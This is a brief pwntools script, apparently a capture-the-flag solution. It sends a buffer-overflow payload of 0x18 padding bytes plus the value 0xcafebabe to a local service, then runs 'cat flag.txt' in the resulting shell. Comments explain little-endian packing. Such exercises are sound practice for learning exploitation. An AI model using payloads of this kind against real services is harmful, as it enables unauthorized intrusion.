from pwn import *


p=remote("localhost",5007)

p.sendline(b"a"*0x18+b"\xbe\xba\xfe\xca")  
#you dont wanna handle little endian on your own , there are automated functions
#p64(),p32(),p16()... p32(0xcafebabe) == b"\xbe\xba\xfe\xca"

# i got my shell now i get the flag
p.sendline("cat flag.txt")

p.interactive()